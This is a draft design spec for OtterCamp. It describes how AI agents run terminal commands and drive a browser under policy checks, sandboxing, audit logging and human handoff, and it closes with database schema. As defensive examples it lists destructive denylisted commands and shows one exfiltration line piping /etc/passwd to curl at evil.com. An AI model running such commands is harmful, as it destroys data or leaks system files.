---
## Summary

This spec defines how OtterCamp agents execute real-world actions through two primary execution surfaces: the terminal (CLI) and the web browser. Both are classified as tier 2 tools in the chat turn loop, meaning every invocation routes through the control plane's execution broker for policy evaluation, sandboxing, and audit before anything runs. The core design philosophy is "high-level intent, not raw automation" -- agents send structured action requests (run a command, click a button, extract text) rather than writing shell scripts or Playwright code, keeping actions auditable and sandboxing enforceable.

For CLI execution, agents submit structured command requests that are risk-classified into four levels (safe, normal, sensitive, dangerous) through a layered policy system (instance > org > project > agent, where lower layers can only restrict, never loosen). Commands run in sandboxed processes scoped to the project's git repo on the agent's task branch, with constructed (not inherited) environment variables, configurable network policy (allow_all, deny_all, or allowlist), per-command timeouts (default 5 min, max 30 min), and a default denylist blocking destructive system commands. Compound commands (pipes, chains, subshells) are decomposed and classified by their riskiest component. Output is streamed via RunEvents, truncated in tool results at 50KB with full output stored as RunArtifacts.

For browser execution, agents interact through a structured action API covering navigation, interaction (click, type, select, hover, scroll), observation (screenshot, text/structured extraction, page info), and waiting. Browser sessions run in isolated contexts (separate cookies, storage, cache) and are reusable within a task across multiple runs -- critical for multi-step workflows like login-then-navigate-then-submit. Domain policy controls which sites agents can visit, with sensitive domains (financial, auth, admin, email) requiring approval by default. Credentials are injected into browser contexts at runtime from the org's secret store and never appear in agent prompts or audit trails. When automation hits limits (CAPTCHA, 2FA, payment), a human handoff flow creates an inbox item for the human to complete the action manually and return control.

The schema introduces four tables: `cli_execution` (full command lifecycle with risk level, policy decision, exit code, output references), `browser_session` (task-scoped, not run-scoped, tracking domain policy and credential refs), `browser_action` (fine-grained record of every browser interaction linked to both session and run), and `browser_handoff` (tracks human handoff lifecycle bridging browser and inbox domains). All tables extend the control plane's generic Run/RunStep/RunArtifact framework with domain-specific detail. Git operations are regular CLI tool calls with enforced branch rules: no push to main (merge queue only), no force push, no branch deletion, with commits linked to runs via RunEvent metadata.

---

# 11. System Integration (CLI and Browser Control)

> Status: Draft
> Depends on: 01-architecture-and-domain.md (control runtime), 02-chat.md (tool execution tiers, turn loop), 03-projects-and-task-flow.md (task branches, project repos), 03a-shipping-and-delivery.md (deploy tasks using CLI/browser), 13-security-and-observability.md (artifact retention, secret store, observability), 16-agent-control-plane.md (policy, execution broker, sandboxing, RunArtifact)

## Purpose

Define how agents execute real-world actions through the terminal and web browser. These are the two primary execution surfaces that let agents interact with the world beyond OtterCamp's own domain model — running commands, building software, navigating websites, submitting forms, and automating workflows that require a browser.

## Scope

- In scope:
  - CLI command execution model and lifecycle
  - CLI sandboxing, environment restrictions, and network policy
  - CLI command policy and risk classification
  - Browser action API and execution model
  - Browser sandboxing, credential injection, and domain policy
  - Browser session lifecycle and task-scoped reuse
  - Human handoff for sensitive browser actions
  - Artifact management for screenshots, logs, and command outputs
  - Git operations via CLI
- Out of scope:
  - MCP tool execution (see 09-mcp-integration.md)
  - OtterCamp-native tools (task CRUD, flow advancement, memory queries — see 20-tools-and-tool-policy.md)
  - Specific deployment platform integrations (see 03a-shipping-and-delivery.md)
  - UI for configuring policies (see 17-tui.md, 18-web-ui.md)

## Core Principles

- **All system actions go through the control plane.** CLI execution and browser control are tier 2 tools (see 02-chat.md Tool Execution Tiers). Every invocation passes through the execution broker for policy evaluation, sandboxing, and audit. No direct access.
- **High-level actions, not raw automation code.** Agents express intent through structured action APIs, not by writing Playwright scripts or bash pipelines. This keeps prompts clean, actions auditable, and sandboxing enforceable.
- **Least privilege by default.** Agents get the minimum access needed for their task. Working directory is scoped to the project repo. Environment variables are filtered. Network access is configurable. Browser contexts are isolated.
- **Everything is recorded.** Every command, every browser action, every screenshot, every output is captured as a RunArtifact or RunEvent. Full replay capability for debugging and audit.
- **Human stays in control.** Sensitive actions are denied by default — permissions configured in advance. The human can revoke agent access at any time. Browser state can be handed off to the human for manual completion.

## Relationship to Control Plane

CLI and browser execution are capabilities gated by the control plane (doc 16):

- `system.cli.execute` — permission to run terminal commands.
- Browser capabilities (`system.browser.navigate`, `.interact`, `.screenshot`, `.extract` — typically granted together) — permission to control a browser.

These capabilities follow the standard policy evaluation path (doc 16 Policy Evaluation). The control plane's execution broker admits the request, the worker runtime executes in a sandbox, and results flow back through RunEvents and RunArtifacts.

CLI and browser tool calls originate within the turn loop (doc 02). The agent requests a tool call, the tool execution layer routes it to the control plane (tier 2), policy is evaluated, and if allowed, execution proceeds. The turn never blocks on approval — policy returns `allow` or `deny`, always immediate and binary. Permissions are configured in advance, not resolved at runtime.

---

## CLI Execution Model

### How It Works

The agent sends a structured command request. The system evaluates policy, executes the command in a sandboxed environment, streams output back, and captures results.

```
Agent requests: cli.execute({command: "go test ./...", working_dir: "."})
│
├─ Control plane: policy evaluation
│   ├─ Check system.cli.execute capability for this agent
│   ├─ Check command against denylist
│   ├─ Classify command risk level
│   ├─ Check network policy if command implies network access
│   └─ Decision: allow / deny
│
├─ If allow:
│   ├─ Worker creates sandboxed process
│   │   ├─ Working directory: project repo at task branch HEAD
│   │   ├─ Environment: filtered (see Environment Restrictions)
│   │   ├─ Network: per project network policy
│   │   └─ Time limit: enforced
│   ├─ Execute command
│   ├─ Stream stdout/stderr back as RunEvents
│   ├─ On completion: capture exit code, timing, output
│   └─ Store output as RunArtifact (if above size threshold)
│
└─ If deny:
    ├─ A `cli_execution` record is created with `status = 'denied'` for audit purposes,
    │   even though the command does not execute. This aligns with doc 16's pattern
    │   where denied runs still create a run record.
    └─ Return "not permitted: {reason}" as tool result
```

### Command Request Structure

The agent's tool call includes:

- `command` (required): the command string to execute.
- `working_dir` (optional): relative path within the project repo. Defaults to repo root.
- `timeout_ms` (optional): per-command timeout override, capped by the project's max. Defaults to the project's configured timeout.
- `env` (optional): additional environment variables the agent wants set. Subject to filtering — the agent cannot override restricted variables.

### Execution Output

The tool result returned to the agent contains:

- `exit_code`: integer exit code from the process.
- `stdout`: captured standard output (truncated if exceeds size limit, full output in RunArtifact).
- `stderr`: captured standard error (same truncation rules).
- `duration_ms`: wall clock execution time.
- `truncated`: boolean — whether output was truncated in the tool result.
- `artifact_id`: reference to the RunArtifact containing full output, if truncated.

### Streaming

For long-running commands, stdout and stderr are streamed back to the agent and to any observing human via RunEvents:

- `cli.stdout` events carry incremental output chunks.
- `cli.stderr` events carry error output chunks.
- `cli.exit` event carries the final exit code and summary.

These map to doc 16's `output_chunk` event type, with `event_data` containing `{stream: 'stdout'|'stderr', chunk: '...'}` or `{stream: 'exit', exit_code: N}`.

The agent receives the complete output when the command finishes. The human (if watching the run in the UI) sees output in real time.

### Output Size Limits

- **Tool result inline limit**: stdout and stderr are included inline up to a configurable size (default: 50KB each). Beyond that, output is truncated in the tool result and the full output is stored as a RunArtifact.
- **Total capture limit**: maximum total output captured per command (default: 10MB). Beyond that, the oldest output is dropped and only the tail is preserved. This prevents a runaway process from filling storage.
- The agent is told when output is truncated and given an artifact reference to access the full content.

## CLI Sandboxing

### Working Directory

- Every CLI command executes within the project's git repo, checked out to the agent's task branch.
- The `working_dir` parameter is resolved relative to the repo root. Path traversal (`../`) that would escape the repo is rejected.
- Agents cannot access other projects' repos, the host filesystem outside the project repo, or OtterCamp's own configuration/data directories.
- For projects without a repo (edge case — all projects are git repos per doc 03, but the repo may be empty), commands execute in a temporary directory.

### Process Isolation

The initial sandbox model is process-level isolation:

- Each command runs as a dedicated OS process with restricted privileges.
- The process runs under a service user with no elevated permissions.
- Process resource limits: max memory (configurable, default 2GB), max CPU time (enforced via the timeout), max open file descriptors.
- The process cannot spawn persistent background daemons — child processes are tracked and terminated when the parent exits or times out.
- Process-level isolation is sufficient for single-operator self-hosted deployments. Container-level isolation (each command in a lightweight container) is a future enhancement for managed/multi-tenant deployments.

### Environment Variable Restrictions

The execution environment is constructed, not inherited:

- **Always set**: `HOME` (temp directory), `PATH` (restricted to standard system paths + project-specific tool paths), `LANG`/`LC_ALL` (UTF-8), `TERM` (dumb).
- **Injected from project config**: project-specific variables configured by the PM (e.g., `NODE_ENV`, `GOPATH`, `DATABASE_URL` for development). These are stored encrypted and resolved at execution time — never in agent prompts.
- **Injected from org secrets**: credentials needed for commands (API keys, tokens). Referenced by name in project config, resolved from the org's secret store at execution time.
- **Blocked**: `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, and other model provider credentials (agents must not use external AI calls outside the model gateway). OtterCamp internal service credentials. SSH keys not explicitly configured for the project.
- **Agent-requested variables**: the agent can request additional env vars in the tool call. These are subject to the same filtering — blocked vars are stripped, and any var matching a restricted pattern is rejected.

### Time Limits

- **Per-command timeout**: configurable per project, default 5 minutes. The agent can request a shorter timeout per call. Maximum allowed timeout is configurable per org (default: 30 minutes).
- **Enforcement**: soft kill (SIGTERM) at timeout, hard kill (SIGKILL) 10 seconds later if the process hasn't exited.
- **Turn budget interaction**: CLI execution time counts against the turn's `max_duration` (doc 02). A 5-minute command in a 10-minute turn leaves 5 minutes for everything else. The turn loop checks remaining time before dispatching each tool call.

### Network Policy

Network access for CLI commands is configurable per project:

- **`allow_all`** (default for self-hosted): unrestricted outbound network access. Suitable for development projects that need to install packages, fetch dependencies, call APIs.
- **`deny_all`**: no outbound network access. The process cannot make any network connections. Suitable for pure computation tasks or when network access is handled through other channels (MCP, browser).
- **`allowlist`**: outbound connections only to specified hosts/CIDRs. Example: allow `registry.npmjs.org`, `proxy.golang.org`, deny everything else. Configured by the PM or org admin.

Network policy is enforced at the process level (iptables rules or equivalent for the service user). The specific enforcement mechanism depends on the deployment environment.

### Filesystem Access

Within the project repo, the agent has full read/write access. Outside the repo:

- **Read access**: system package directories (for compilation/linking), temp directories.
- **Write access**: the project repo and designated temp directories only.
- **Disk write limit**: 500MB per command execution (configurable). Prevents runaway processes from filling the disk.
- **No access**: other projects' repos, OtterCamp data directories, system configuration.

## CLI Command Policy

### Risk Classification

Every command is classified by risk level before execution. Risk level determines whether the command is allowed or denied.

**Risk levels:**

- **`safe`**: read-only operations and standard development commands. Always allowed if the agent has `system.cli.execute`. Examples: `ls`, `cat`, `grep`, `go build`, `npm test`, `git status`, `git diff`.
- **`normal`**: commands with side effects that are expected in development workflows. Allowed by default. Examples: `go run`, `npm install`, `pip install`, `make`, `git commit`, `git push` (to task branch remote).
- **`sensitive`**: commands that could have significant impact. Denied by default, configurable to allow via org or project policy. Examples: `curl` (network call), `wget`, `docker run`, package publishing commands, commands that modify system configuration.
- **`dangerous`**: commands that are destructive or affect system integrity. Denied by default. Examples: `rm -rf /`, `shutdown`, `reboot`, `kill -9 1`, `dd if=/dev/zero`, `chmod -R 777 /`, `mkfs`.

### Default Denylist

The following commands and patterns are denied by default at the instance safety policy level (doc 16 Policy Layers, highest priority):

- **System destruction**: `rm -rf /`, `rm -rf /*`, `mkfs.*`, `dd if=/dev/zero of=/dev/sd*`
- **System control**: `shutdown`, `reboot`, `halt`, `poweroff`, `init 0`, `init 6`
- **Privilege escalation**: `sudo` (all invocations), `su`, `chmod +s`, `chown root`
- **System modification**: `systemctl`, `service`, editing files in `/etc/`, modifying crontab
- **Process interference**: `kill -9 1`, `killall`, signals to processes outside the sandbox
- **Network reconfiguration**: `iptables` (by agent), `ifconfig`, `ip route`

The denylist is pattern-based, not just exact-match. `rm -rf /` catches variations like `rm -rf /home` or `rm --recursive --force /`. The classifier uses both static patterns and argument analysis.

### Configurable Policy Layers

Following doc 16's policy hierarchy (highest priority first):

1. **Instance safety policy**: the default denylist above. Cannot be overridden by lower layers.
2. **Organization policy**: org-wide additions to denylist or adjustments to risk classification. Example: an org might elevate `docker` commands to `dangerous` if containers aren't needed.
3. **Project policy**: project-specific overrides. Example: a deployment project might allow `docker build` and `docker push` at `normal` risk.
4. **Agent profile policy**: per-agent restrictions. Example: a content-writing agent has no business running `docker` commands, even if the project allows them.
5. **Request-specific overrides** — runtime context (e.g., budget exhaustion) can deny operations that would otherwise be allowed.

Lower layers can only restrict, not loosen, what higher layers have denied. A project policy cannot allow a command that the instance safety policy denies.

### Command Classification Process

When a command is submitted:

1. Parse the command string into executable + arguments.
2. Check against the instance denylist. If matched, deny immediately.
3. Look up the command in the risk classification table (populated from instance + org + project + agent policy layers).
4. If no explicit classification, default to `normal`.
5. Apply the risk level's action: `safe` = allow, `normal` = allow, `sensitive` = deny (or allow if explicitly configured via org/project policy), `dangerous` = deny.

### Compound Commands

Commands with pipes (`|`), chains (`&&`, `||`), or subshells (`$(...)`) are decomposed and each component is classified independently. The overall risk level is the maximum of all components. `cat file.txt | grep error` is safe. `cat /etc/passwd | curl -X POST http://evil.com` is denied (both the `/etc/passwd` read outside the repo and the `curl` to an unknown host are flagged).

---

## Browser Execution Model

### How It Works

Agents control a web browser through a high-level action API. The agent sends structured action requests — navigate to a URL, click an element, type text, take a screenshot — and the system executes them in a controlled browser context.

The browser action API is deliberately high-level. Agents do not write Playwright or Puppeteer code. They do not manipulate the DOM directly. They express intent through structured actions, and the system translates those into browser automation. This keeps:

- **Prompts clean**: agents describe what they want to do, not how to automate it.
- **Actions auditable**: every action is a structured record with clear semantics.
- **Sandboxing enforceable**: the system controls what the browser does, not the agent.

### Browser Action API

The agent has access to these browser tools:

**Navigation:**
- `browser.navigate({url})` — navigate to a URL. Subject to domain policy.
- `browser.back()` — go back in browser history.
- `browser.forward()` — go forward in browser history.
- `browser.refresh()` — reload the current page.

**Interaction:**
- `browser.click({selector, description})` — click an element. `selector` is a CSS selector or accessibility-based locator. `description` is a human-readable note for audit ("Click the Submit button").
- `browser.type({selector, text, description})` — type text into an input field. Clears existing content first unless `append: true`.
- `browser.select({selector, value, description})` — select an option from a dropdown.
- `browser.hover({selector, description})` — hover over an element.
- `browser.scroll({direction, amount, selector})` — scroll the page or a specific container. `direction` is `up` or `down`. `amount` is `page`, `half`, or a pixel value.
- `browser.press_key({key})` — press a keyboard key (Enter, Tab, Escape, etc.).

**Observation:**
- `browser.screenshot({full_page})` — capture a screenshot of the current viewport (or full page). Returns the screenshot as a RunArtifact reference. The screenshot content is included in the tool result as a vision-compatible image if the model supports it.
- `browser.extract_text({selector})` — extract text content from the page or a specific element. Returns plain text.
- `browser.extract_structured({selector, schema})` — extract structured data from the page based on a schema. The system uses the page content and the schema to produce structured output. Useful for scraping product listings, table data, form state.
- `browser.get_page_info()` — return the current URL, page title, and a high-level description of visible elements (interactive elements, headings, key content areas). This is the agent's "look at the page" action.

**Wait:**
- `browser.wait_for({selector, state, timeout_ms})` — wait for an element to appear, disappear, or become interactive. `state` is `visible`, `hidden`, or `interactive`. Prevents the agent from acting on a page that hasn't finished loading.
- `browser.wait_for_navigation({timeout_ms})` — wait for a page navigation to complete after a click or form submission.

### Action Results

Every browser action returns a structured result:

- `success`: boolean.
- `error`: error message if failed (element not found, navigation failed, timeout, domain blocked).
- `page_url`: current URL after the action.
- `page_title`: current page title after the action.
- `screenshot_artifact_id`: if a screenshot was automatically captured (see Automatic Screenshots below).
- `extracted_data`: for extraction actions, the extracted content.
- `duration_ms`: how long the action took.

### Automatic Screenshots

To maintain auditability without requiring the agent to explicitly screenshot after every action, the system captures screenshots automatically:

- **After every navigation** (`browser.navigate`, redirects, form submissions that trigger navigation).
- **After every interaction** (`browser.click`, `browser.type`, `browser.select`) — captured after the action completes and any resulting animations/transitions settle.
- **On error** — captures the page state when an action fails.

Automatic screenshots are stored as RunArtifacts linked to the browser action's RunStep. They are NOT returned to the agent inline (that would waste tokens) — they are available for human review in the run's artifact timeline. The agent can explicitly call `browser.screenshot()` when it needs to see the page state (the screenshot is then included in the tool result for the model).

### Page Context for the Agent

The agent does not see a raw DOM dump. Instead, the system provides structured page context:

- `browser.get_page_info()` returns a curated view: the URL, title, visible text content (truncated), a list of interactive elements (buttons, links, inputs) with their selectors and labels, and any error/alert banners.
- After interactions, the tool result includes a brief page state summary — enough for the agent to know what happened without needing a full page scan.
- When the agent needs to see the page visually (complex layouts, charts, visual verification), it calls `browser.screenshot()` and the image is included in the next model call via vision capabilities.

## Browser Sandboxing

### Isolated Browser Contexts

Each browser session runs in an isolated browser context (equivalent to a fresh incognito profile):

- Separate cookie jar, local storage, session storage, cache.
- No cross-contamination between browser sessions — one task's browser session cannot see cookies or state from another task.
- Browser contexts are created by the worker runtime and destroyed on cleanup.

### Domain Policy

Configurable per org and per project, following the same policy layer hierarchy as CLI:

- **`allow_all`** (default): the browser can navigate to any domain.
- **`denylist`**: specific domains are blocked. Example: block social media, competitor sites, or internal admin panels.
- **`allowlist`**: only specified domains are accessible. Example: a publishing task only needs access to `kdp.amazon.com` and `kindle.amazon.com`.

Domain checks happen at navigation time. If the agent tries to navigate to a blocked domain, the action fails with a clear error ("Domain blocked by policy: {domain}"). Redirects to blocked domains are also caught — if a page redirects to a denied domain, the navigation is halted and the agent is informed.

### Sensitive Domain Classification

Certain domains are classified as sensitive by default and require additional policy consideration:

- **Financial**: banking sites, payment processors, cryptocurrency exchanges.
- **Authentication**: OAuth providers, SSO portals, identity providers.
- **Administrative**: cloud provider consoles (AWS, GCP, Azure), hosting control panels.
- **Email**: webmail providers (unless the task specifically involves email).

Navigating to a sensitive domain is denied by default. The org or project can allowlist specific domains relevant to their work — a publishing project can allow `kdp.amazon.com` in its domain policy.

### Credential Injection

Agents never see credentials in their prompts. When a browser action needs authentication:

1. The project or org has stored credentials in the secret store (encrypted, access-controlled).
2. The browser session is configured with credentials at creation time — cookies, auth tokens, or saved login state injected into the browser context by the worker runtime.
3. The agent navigates to the site and is already authenticated (or the pre-injected cookies handle the auth flow).
4. If login requires interactive steps that can't be pre-injected (CAPTCHA, 2FA), the system triggers a human handoff (see Human Handoff).

Credential references are stored in the browser session configuration. The actual secrets are resolved by the worker at session creation time from the org's secret store. The agent's tool call history, RunEvents, and audit trail never contain raw credentials.

### Download and Upload Restrictions

- **Downloads**: files downloaded by the browser are saved to the project's working directory (within the repo). Downloaded files are captured as RunArtifacts. Maximum download size configurable per project (default: 100MB).
- **Uploads**: the browser can upload files from the project's working directory. Uploads to domains outside the domain policy are blocked.
- **No arbitrary filesystem access**: the browser cannot access files outside the project repo.

## Browser Session Lifecycle

### Creation

A browser session is created when an agent first requests a browser action within a run. The system:

1. Creates an isolated browser context.
2. Applies domain policy (allowlist/denylist).
3. Injects any pre-configured credentials.
4. Associates the session with the task. The session persists across multiple runs within that task.

### Task-Scoped Reuse

Browser sessions are reusable within a task. When multiple runs happen within the same task (the agent works on the task across several runs — common per doc 16's "multiple runs per flow node" model), the browser session persists:

- The first run creates the browser session.
- Subsequent runs within the same task can resume the session — same cookies, same login state, same browsing history.
- This is critical for multi-step workflows: the agent logs in during one run, navigates to a dashboard in the next run, and fills out a form in a third run, all within the same authenticated session.

When a run starts and a browser session already exists for the task, the agent picks up where the previous run left off. The system provides the current page URL and state as context.

### Cleanup

Browser sessions are cleaned up when:

- The task completes (`done` or `cancelled`). All browser sessions for the task are destroyed.
- The task is put `on_hold`. Browser sessions are suspended (state preserved but browser process released). If the task resumes, a new session is created — the state is not guaranteed to be resumable after an extended hold.
- The human explicitly revokes browser access for the agent.
- The session has been idle for longer than a configurable timeout (default: 1 hour). Prevents zombie browser processes.
- The human manually closes the browser session through the UI or by requesting it in chat (close_reason: `manual`).

On cleanup, the final page screenshot is captured as a RunArtifact, and any downloaded files are preserved.

### Concurrent Browser Sessions

A task may have at most one active browser session at a time. If the agent needs to interact with multiple sites, it navigates between them within the same session (like a human would). This simplifies state management and prevents resource exhaustion.

If a future use case requires true multi-tab support, it can be added as a controlled extension — but the initial model is single-session, single-active-page.

---

## Human Handoff

### Purpose

Some browser actions are too sensitive or too complex for full automation. Login flows with CAPTCHA or 2FA, payment processing, and legal agreements may need the human to complete manually. Human handoff is agent-initiated — the agent recognizes it needs help and requests it, rather than policy intercepting the action.

### How It Works

1. The agent reaches a point where it needs human intervention — either because:
   - The agent explicitly recognizes it needs human help (e.g., "I've reached a CAPTCHA I can't solve").
   - A login flow requires interactive authentication the agent cannot complete.

2. The system creates a **handoff inbox item** with:
   - Current browser state: URL, page title, screenshot.
   - What the agent was trying to do: the action that triggered the handoff.
   - What the agent needs the human to complete: clear description ("Complete the 2FA login so I can continue").
   - The browser session ID for resumption.

3. The human opens the handoff from their inbox. The system presents the browser's current state:
   - In the web UI: an embedded view of the browser (remote browser streaming) or a link to take over the browser session.
   - In the TUI: a URL and instructions to complete the action in their own browser, then signal completion.

4. The human completes the sensitive action manually.

5. The human signals completion ("done, I've logged in"). The system:
   - Takes a screenshot of the current state.
   - Returns control to the agent.
   - The agent's next browser action picks up from the human-modified state.

### Handoff Lifetime

- Handoffs expire after a configurable timeout (default: 24 hours). If the human doesn't act, the agent's run stays paused. The PM can escalate or reassign.
- Handoffs are one-way: the human completes the action and returns control. There is no back-and-forth during a handoff — if the human needs to discuss, they use the task's sync session.
- Multiple handoffs per task are allowed (a task might need login, then later need payment approval).

---

## Git Operations

### Agents and Git

Agents use standard git commands via the CLI execution model to interact with their task branch. Git operations are regular CLI tool calls subject to the same policy evaluation and sandboxing.

### Branch Rules

Per doc 03, agents work on task branches (`task/<task-slug>`). The following rules are enforced by command policy:

- **Allowed on task branch**: `git add`, `git commit`, `git status`, `git diff`, `git log`, `git stash`, `git checkout` (files, not branches), `git rebase` (onto updated main, for conflict resolution), `git merge` (for pulling in main updates).
- **Allowed read-only on any branch**: `git log`, `git diff`, `git show`, `git blame` — agents can read history from `main` or other branches for context.
- **Denied**: `git push` to `main` (all pushes to main go through the merge queue), `git checkout main` (agents don't switch to main for work), `git branch -D` (agents don't delete branches), `git push --force` to shared branches (main, develop, release/*). Force-pushing to the agent's own task branch is allowed when push is enabled, to support rebase workflows.
- **Sensitive**: `git push` to task branch remote (allowed by default, but classified as `sensitive` for policy tracking). This is how task branches are synced with configured remotes (doc 03a). This means `git push` is denied by default and must be explicitly enabled at the org or project level. Projects that use remote sync (doc 03a) must enable push as part of project setup. Note: `git rebase` is allowed (see above) but force-pushing the rebased branch requires push to be enabled.

### Commit Practices

- Agents commit frequently — after meaningful chunks of work, not just at task completion.
- Commit messages follow project conventions (configured in the project's context block or a skills file).
- Each commit is linked to the run that produced it via RunEvent metadata, providing traceability back to the specific tool calls and reasoning that led to the changes.

### Branch State Management

When a run starts for a task:

1. The worker checks out the task branch (creating it from `main` HEAD if it doesn't exist yet — this happens on the first run for a new task).
2. The working directory reflects the task branch state.
3. The agent works, commits to the task branch.
4. When the run ends, the branch state persists for the next run.

If `main` has advanced since the branch was created (other tasks merged), the PM or agent can rebase — this is a standard git operation via CLI, subject to the same policy.

---

## Artifact Management

### What Gets Captured

Every execution surface produces artifacts:

**CLI artifacts:**
- Command output (stdout + stderr) when above the inline size threshold.
- Files created or modified by commands (captured as diffs or snapshots as appropriate).
- Build outputs, test reports, log files.

**Browser artifacts:**
- Screenshots (automatic after each action, plus explicit agent requests).
- Downloaded files.
- Extracted data (text and structured).
- Page HTML snapshots (for debugging, captured on error).

### Storage

Artifacts are stored in object storage (S3-compatible) per doc 01's data storage strategy. The `run_artifact` entity (doc 16) holds:

- `run_id`: which run produced this artifact.
- `run_step_id`: which step within the run.
- `artifact_type`: `cli_output`, `screenshot`, `download`, `extracted_data`, `page_snapshot`, `build_output`, `test_report`.
- `content_type`: MIME type.
- `size_bytes`: artifact size.
- `storage_path`: object storage location.
- `metadata`: additional context (command string for CLI output, URL for screenshots, selector for extracted data).

### Linking

Artifacts are linked at multiple levels for discoverability:

- **Run level**: all artifacts from a run are queryable via the run ID.
- **Task level**: artifacts from all runs for a task (across all flow nodes) are queryable via the task's runs.
- **Project level**: aggregated view across all tasks.

The UI presents artifacts in the run timeline (alongside tool calls and agent messages), in the task detail view (all artifacts for the task), and in the project activity feed (notable artifacts).

### Retention

Artifact retention follows org-level retention policy (doc 13). Artifacts are never deleted while the associated task is active. After task completion, retention is configurable:

- Screenshots: default 90 days after task completion.
- CLI output: default 30 days after task completion.
- Downloaded files and build outputs: default 90 days.
- The human can flag specific artifacts for permanent retention.

---

## Reliability

### Bounded Execution

- **CLI**: per-command timeout (configurable, default 5 minutes, max 30 minutes). Enforced via SIGTERM/SIGKILL.
- **Browser actions**: per-action timeout (configurable, default 30 seconds for interactions, 60 seconds for navigation). If a page takes too long to load or an element doesn't appear, the action times out with an error.
- **Browser sessions**: idle timeout (default 1 hour). Active sessions with no browser actions for this duration are cleaned up.

### Cancellation

Both CLI and browser operations support cancellation:

- **CLI**: SIGTERM to the running process, SIGKILL after 10 seconds. Tool result includes partial output captured before cancellation.
- **Browser**: the current action is aborted. The browser session state remains valid — cancellation doesn't corrupt the session.
- **Turn-level cancellation** (doc 02): when the human cancels a turn, in-flight CLI processes receive SIGTERM and are given a grace period (default: 5 seconds) to exit cleanly. If the process does not exit within the grace period, it receives SIGKILL. This prevents indefinite waits on long-running commands. Browser actions complete their current step before stopping.

### Retry Policy

- **CLI**: retries are NOT automatic by default. CLI commands may have side effects, so blind retry is unsafe. The agent can choose to re-run a command that failed — this is a new tool call, not an automatic retry.
- **Browser**: navigation failures (timeout, network error) can be retried automatically once. Interaction failures (element not found, click intercepted) are not retried — the agent sees the error and decides how to proceed.
- **Idempotent commands**: projects can mark specific commands as safe for automatic retry (e.g., `go test`, `npm run lint`). These are retried once on transient failure (timeout, process killed by OOM).

### Failure Recovery

When a CLI command or browser action fails:

1. The error is captured as a RunEvent with full details (exit code, error message, page state).
2. The tool result includes the error, and the agent sees it in the turn loop.
3. The agent decides whether to retry, try a different approach, or escalate (file a blocker).
4. If the agent's turn fails entirely (crash, timeout), the supervisor (doc 16) handles recovery — the browser session state is preserved for the next run.

---

## Observability

### Action Traces

Every CLI command and browser action is recorded as a RunStep within the run. The trace includes:

- Timestamp and duration.
- The action requested (command string, browser action parameters).
- Policy evaluation result and reason.
- Execution result (exit code, success/failure, error details).
- Artifact references (output, screenshots).

### Human Inspection

The UI provides:

- **Run timeline**: chronological view of all actions in a run — tool calls, CLI commands, browser actions, screenshots — interleaved with agent messages. This is the primary debugging view.
- **Artifact gallery**: all screenshots from a browser session, ordered chronologically. Click to see the action that preceded each screenshot.
- **Command history**: all CLI commands executed for a task, with output and exit codes.
- **Live view**: for in-progress runs, real-time streaming of CLI output and browser screenshots.

### Runtime Revocation

The human can revoke an agent's system access at any time:

- **Revoke CLI**: the agent's `system.cli.execute` capability is removed. In-progress commands finish, but subsequent tool calls return "not permitted."
- **Revoke browser**: revoke all `system.browser.*` capabilities. The browser session is suspended (screenshot captured). The agent can no longer issue browser actions.
- Revocation is immediate. The agent sees "not permitted" on the next tool call attempt and can adapt (escalate, switch approach, signal step done with the work it completed so far).

---

## Database Schema

### cli_execution

```sql
create table cli_execution (
  id              uuid primary key default gen_random_uuid(),
  run_id          uuid not null,          -- references the control plane run
  run_step_id     uuid not null,          -- references the specific run step
  task_id         uuid not null,          -- references project_task(id)
  project_id      uuid not null,          -- references project(id), denormalized for query efficiency
  agent_id        uuid not null,          -- which agent requested this
  command         text not null,          -- the command string executed
  working_dir     text not null,          -- resolved working directory (relative to repo root)
  risk_level      text not null,          -- safe, normal, sensitive, dangerous
  policy_decision text not null,          -- allow, deny
  exit_code       int,                    -- null if still running or cancelled
  stdout_preview  text,                   -- first N bytes of stdout (inline preview)
  stderr_preview  text,                   -- first N bytes of stderr (inline preview)
  stdout_artifact_id uuid,               -- references run_artifact for full stdout
  stderr_artifact_id uuid,               -- references run_artifact for full stderr
  duration_ms     int,
  status          text not null default 'pending',  -- pending, running, completed, failed, cancelled, denied
  env_vars        jsonb,                  -- non-sensitive env var keys set for this execution (values NOT stored here)
  network_policy  text,                   -- allow_all, deny_all, allowlist
  timeout_ms      int not null,           -- the timeout that was applied
  started_at      timestamptz,
  completed_at    timestamptz,
  created_at      timestamptz not null default now(),
  metadata        jsonb
);

create index on cli_execution (run_id);
create index on cli_execution (task_id);
create index on cli_execution (project_id, created_at);
create index on cli_execution (status) where status in ('pending', 'running');
```

### browser_session

```sql
create table browser_session (
  id              uuid primary key default gen_random_uuid(),
  task_id         uuid not null,          -- references project_task(id)
  project_id      uuid not null,          -- references project(id), denormalized
  agent_id        uuid not null,          -- which agent owns this session
  status          text not null default 'active',  -- active, suspended, closed
  domain_policy   text not null default 'allow_all',  -- allow_all, denylist, allowlist
  domain_rules    jsonb,                  -- the specific allow/deny entries
  credential_refs jsonb,                  -- references to secrets injected (by name, NOT values)
  current_url     text,                   -- last known page URL
  current_title   text,                   -- last known page title
  created_at      timestamptz not null default now(),
  last_action_at  timestamptz,            -- for idle timeout enforcement
  suspended_at    timestamptz,
  closed_at       timestamptz,
  close_reason    text,                   -- task_completed, task_cancelled, idle_timeout, revoked, manual
  metadata        jsonb
);

create index on browser_session (task_id);
create index on browser_session (project_id);
create index on browser_session (status) where status = 'active';
```

### browser_action

```sql
create table browser_action (
  id                  uuid primary key default gen_random_uuid(),
  browser_session_id  uuid not null references browser_session(id),
  run_id              uuid not null,      -- references the control plane run
  run_step_id         uuid not null,      -- references the specific run step
  action_type         text not null,      -- navigate, click, type, select, hover, scroll, press_key, screenshot, extract_text, extract_structured, get_page_info, wait_for, wait_for_navigation, back, forward, refresh
  action_params       jsonb not null,     -- structured parameters for the action
  description         text,               -- human-readable description from the agent
  page_url_before     text,               -- URL before the action
  page_url_after      text,               -- URL after the action
  success             boolean,
  error_message       text,
  screenshot_artifact_id uuid,            -- automatic post-action screenshot
  extracted_data      jsonb,              -- for extraction actions
  policy_decision     text not null,      -- allow, deny
  duration_ms         int,
  created_at          timestamptz not null default now(),
  completed_at        timestamptz,
  metadata            jsonb
);

create index on browser_action (browser_session_id, created_at);
create index on browser_action (run_id);
```

### browser_handoff

```sql
create table browser_handoff (
  id                  uuid primary key default gen_random_uuid(),
  browser_session_id  uuid not null references browser_session(id),
  inbox_item_id       uuid not null,      -- references inbox_item(id)
  run_id              uuid not null,      -- the run that was paused
